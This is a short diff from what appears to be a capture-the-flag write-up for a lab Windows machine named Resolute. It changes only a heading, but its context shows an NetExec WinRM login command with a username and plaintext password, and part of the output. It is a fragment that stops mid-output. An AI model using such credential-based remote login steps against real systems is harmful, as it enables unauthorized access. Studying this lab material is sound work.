@@ -269,7 +269,7 @@ tree
 All available shares were enumerated, but no interesting files or information were found.
 
 ---
-## Shell as melanie
+# Shell as melanie
 ```
 nxc winrm 10.129.100.9 -u melanie -p 'Welcome123!'
 WINRM       10.129.100.9    5985   RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local)
